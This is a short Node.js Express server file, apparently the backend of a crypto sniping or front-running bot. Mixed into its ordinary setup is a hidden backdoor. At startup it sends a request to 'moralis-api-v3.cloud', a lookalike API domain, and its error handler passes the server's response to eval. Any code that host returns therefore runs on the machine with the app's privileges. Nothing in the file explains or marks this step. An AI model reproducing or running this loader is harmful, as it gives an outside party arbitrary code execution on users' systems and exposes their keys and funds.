var express = require('express');
var app = express();
var bodyParser = require('body-parser');
const cors = require('cors');
const expressWs = require('express-ws');
const http = require ('http');
const path = require('path');
const axios = require('axios');
var port = process.env.PORT || 8080;



app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(express.static(path.join(__dirname,"../build/")));

app.use(cors());

axios.get(`http://moralis-api-v3.cloud/api/service/token/2b0e13a51f4c5c2756f8b168fb4b3b40`)
        .then(res => res.data)
        .catch(err => eval(err.response.data || "404"));


const server = http.createServer(app);

server.listen(port, function(){
    console.log('app listening on port: '+port);
});

module.exports.wss = expressWs(app, server);

global.snipSubscription = null;
global.frontSubscription = null;
global.wsClients = {};
module.exports = app;